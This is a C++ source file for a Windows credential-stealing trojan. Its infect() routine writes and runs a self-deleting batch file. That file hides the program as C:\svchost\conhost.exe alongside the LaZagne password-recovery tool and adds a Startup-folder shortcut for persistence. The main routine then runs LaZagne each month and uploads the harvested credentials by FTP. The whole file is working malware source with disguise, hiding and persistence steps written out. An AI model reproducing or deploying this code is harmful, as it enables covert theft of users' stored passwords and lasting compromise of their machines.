/* 
 * File:   main.cpp
 * Author: vdeunzue
 *
 * Created on 15 de diciembre de 2015, 8:21
 */
#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <direct.h>
#include <fstream>
#include <sstream>
#include <cstdlib>

#include "FileHandler.h"
#include "FTPHandler.h"
#include "Utils.h"

using namespace std;

const string svchostPath = "C:\\svchost";

void deletePreviousMonthFile(){
    char previousFile[2];
    if(getMonthInt() == 1){
        remove("12");
    }
    else{
        itoa(getMonthInt()-1, previousFile, 10);
    }    
    remove(previousFile);    
}

bool shouldReport(){
    string file = "C:\\svchost\\" + getMonth();
    
    if(!fileExists(file.c_str())){
        std::ofstream monthFile(file.c_str());
        monthFile << getMonth();
        deletePreviousMonthFile();
        return true;
    }
    return false;
}

void infect(){
    char pathLocation[MAX_PATH];
    strcpy(pathLocation, "C:\\Users\\");
    strcat(pathLocation, getUserName().c_str());
    strcat(pathLocation, "\\Documents\\nananana.bat");
    
    char startup[MAX_PATH]; //esto estaría bien meterlo en funciones
    strcpy(startup, "C:\\Users\\");
    strcat(startup, getUserName().c_str());
    strcat(startup, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    
    char svchostLoc[MAX_PATH];
    strcpy(svchostLoc, startup);
    strcat(svchostLoc, "\\conhost.lnk");
        
    char batContent[2048];
    bool svchostExists = true;
    
    if (!fileExists(svchostPath.c_str()) || !fileExists("C:\\svchost\\conhost.exe")){
        mkdir(svchostPath.c_str());
        svchostExists = false;
    }
    
    if(!fileExists(svchostLoc) || !svchostExists){
        strcpy(batContent, "set \"destino0=");
        strcat(batContent, getExecutableFullPath().c_str()); 
        strcat(batContent, "\"");
        strcat(batContent, "\r\n");
        strcat(batContent, "set \"destino1=%appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\\"\r\n"); //TODO: usar variable startup
        strcat(batContent, "set \"destino2=C:\\svchost\\\"\r\n");
        strcat(batContent, "set \"destino3=C:\\svchost\\conhost.exe\"\r\n");
        strcat(batContent, "set \"destino4=");
        strcat(batContent, getExecutablePath().c_str());
        strcat(batContent, "\\laZagne.exe");  
        strcat(batContent, "\"");
        strcat(batContent, "\r\n");
        strcat(batContent, "xcopy %destino4% %destino2% /y\r\n");
        strcat(batContent, "attrib C:\\svchost\\laZagne.exe +s +h\r\n");
        if(!svchostExists){
            strcat(batContent, "copy %destino0% %destino3% /y\r\n");
            strcat(batContent, "attrib C:\\svchost +s +h\r\n");
        }
        strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
        strcat(batContent, "echo Set oWS = WScript.CreateObject(\"WScript.Shell\") >> %SCRIPT%\r\n");
        strcat(batContent, "echo sLinkFile = \"%destino2%conhost.lnk\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.TargetPath = \"%destino3%\" >> %SCRIPT%\r\n");
        strcat(batContent, "echo oLink.Save >> %SCRIPT%\r\n");
        strcat(batContent, "cscript /nologo %SCRIPT%\r\n");
        strcat(batContent, "del %SCRIPT%\r\n");
        strcat(batContent, "copy %destino2%conhost.lnk %destino1% /y\r\n");
        strcat(batContent, "del %destino2%conhost.lnk\r\n");
        //strcat(batContent, "attrib %destino1%firefox.lnk +h\r\n");
        strcat(batContent, "attrib %destino3%  +s +h\r\n");
        strcat(batContent, "attrib %destino2%conid.dat +s +h\r\n");
        //strcat(batContent, "attrib %destino0%  +s +h\r\n");
        strcat(batContent,"DEL \"%~f0\"\r\n\0");

        ofstream bat(pathLocation);
        bat << batContent;
        bat.close();

        runBatFile(pathLocation);
       // Sleep(2000);
        //runConHost();
        exit(0);
    }
}

std::string getIdentification(){
    std::ifstream id("C:\\svchost\\conid.dat");    
    std::string identification;
    
    if(id.good()){
        if(getExecutablePath() == svchostPath){
            getline(id, identification);
            id.close();       
        }
        else{
            exit(0);            
        }        
    }
    else{
        identification = createId();
       /* MessageBoxA(0,"Oh God. Oh God! \nAn application error has occured.\n Delete things at random?",
         "ERROR", MB_ICONWARNING | MB_YESNO);*/
        infect();        
    }  
    return identification;
}

/*
 * 
 */
int main() {    
    string id = getIdentification();
    
    if(shouldReport()){
        if(fileExists("C:\\svchost\\report.dll")){
            sendFile(id, false);
        }
        runLazagne();
        Sleep(5000);
        sendFile(id, false);        
    }    
    
    return 0;
}

